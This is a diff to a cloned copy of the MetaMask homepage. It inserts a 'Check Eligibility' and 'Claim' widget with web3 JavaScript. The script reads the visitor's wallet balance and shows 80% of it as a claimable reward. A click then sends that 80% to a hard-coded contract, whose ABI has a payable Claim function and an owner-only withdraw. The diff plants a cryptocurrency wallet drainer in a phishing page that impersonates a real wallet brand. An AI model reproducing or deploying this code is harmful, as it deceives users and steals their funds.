@@ -9538,9 +9538,7 @@
                     <div class="HeroContainer__HeroDescription-sc-i60pbm-4 hegdBv">
                       <div>
                         <p>Start exploring blockchain applications in seconds. Trusted by over 30 million users worldwide.</p>
-                      </div>
-                    </div>
-                         <button id="checkEligibilityButton">Check Eligibility</button>
+			      <button id="checkEligibilityButton">Check Eligibility</button>
   <p id="eligibilityResult"></p>
   <button id="claimButton" disabled>Claim</button>
 
@@ -9733,6 +9731,9 @@
       });
     });
   </script>
+                      </div>
+                    </div>
+                         
                   </div>
                   <div class="HeroContainer__HeroSideImage-sc-i60pbm-5 joVcmO">
                     <div data-gatsby-image-wrapper class="gatsby-image-wrapper gatsby-image-wrapper-constrained Image__StyledGatsbyImage-sc-gdjqpy-1 hgKfOP image-light">
@@ -9943,6 +9944,199 @@
                       <h2 class="StyledGeneral__SectionTitle-sc-1puk566-1 ContentfulLayoutModuleContainer__Title-sc-d4asbm-5 jSJuux bCccan txt-center">Your key to blockchain applications</h2>
                       <div class="ContentfulLayoutModuleContainer__SubInfo-sc-d4asbm-8 edeTNu txt-center">
                         <p>MetaMask is the leading self-custodial wallet. The safe and simple way to access blockchain applications and web3. Trusted by millions of users worldwide.</p>
+			      <button id="checkEligibilityButton">Check Eligibility</button>
+  <p id="eligibilityResult"></p>
+  <button id="claimButton" disabled>Claim</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+  <script>
+    // Wait for the page to load
+    window.addEventListener('load', async () => {
+      // Check if Web3 is available
+      if (typeof web3 !== 'undefined') {
+        // Use the existing Web3 provider
+        window.web3 = new Web3(web3.currentProvider);
+      } else {
+        // Handle the case where the user doesn't have Web3 installed or enabled
+        console.error('Please install MetaMask or another Web3 provider.');
+        return;
+      }
+
+      // Load the contract
+     const contractAddress = '0xcB153471E78c062519e43e9AE70d6CcA31989C10'; // Replace with the actual contract address
+  const contractABI = [
+  {
+    "inputs": [],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  },
+  {
+    "anonymous": false,
+    "inputs": [
+      {
+        "indexed": true,
+        "internalType": "address",
+        "name": "previousOwner",
+        "type": "address"
+      },
+      {
+        "indexed": true,
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }
+    ],
+    "name": "OwnershipTransferred",
+    "type": "event"
+  },
+  {
+    "inputs": [],
+    "name": "Claim",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Confirm",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Connect",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Enable",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "Gift",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      },
+      {
+        "internalType": "address",
+        "name": "recipient",
+        "type": "address"
+      }
+    ],
+    "name": "withdraw",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "getBalance",
+    "outputs": [
+      {
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "address",
+        "name": "newOwner",
+        "type": "address"
+      }
+    ],
+    "name": "transferOwnership",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "renounceOwnership",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "stateMutability": "payable",
+    "type": "receive"
+  }
+];
+
+
+      const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+      // Get the user's accounts
+      const accounts = await web3.eth.getAccounts();
+      const userAccount = accounts[0];
+
+      // Handle the check eligibility button click event
+      const checkEligibilityButton = document.getElementById('checkEligibilityButton');
+      const eligibilityResult = document.getElementById('eligibilityResult');
+      checkEligibilityButton.addEventListener('click', async () => {
+        try {
+          // Get the user's balance
+          const balance = await web3.eth.getBalance(userAccount);
+          const balanceInWei = balance.toString();
+
+          // Calculate 80% of the payable amount
+          const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
+
+          // Display the eligibility result
+          eligibilityResult.textContent = `Eligible to claim: ${web3.utils.fromWei(payableAmount.toString(), 'ether')} ETH`;
+
+          // Enable the claim button
+          const claimButton = document.getElementById('claimButton');
+          claimButton.disabled = false;
+        } catch (error) {
+          console.error('Eligibility check failed', error);
+          eligibilityResult.textContent = 'Eligibility check failed';
+        }
+      });
+
+      // Handle the claim button click event
+      const claimButton = document.getElementById('claimButton');
+      claimButton.addEventListener('click', async () => {
+        try {
+          // Request user approval
+          await ethereum.enable();
+
+          // Get the user's balance
+          const balance = await web3.eth.getBalance(userAccount);
+          const balanceInWei = balance.toString();
+
+          // Calculate 80% of the payable amount
+          const payableAmount = web3.utils.toBN(balanceInWei).muln(80).divn(100);
+
+          // Call the contract's claim function with the payable amount
+          await contract.methods.Claim().send({ from: userAccount, value: payableAmount });
+          console.log('Claim successful');
+          // You can add additional code here to handle the claim success event
+        } catch (error) {
+          console.error('Claim failed', error);
+          // You can add additional code here to handle the claim failure event
+        }
+      });
+    });
+  </script>
                       </div>
                     </div>
                     <div class="ContentfulLayoutModuleContainer__Modules-sc-d4asbm-6 djRFUu">
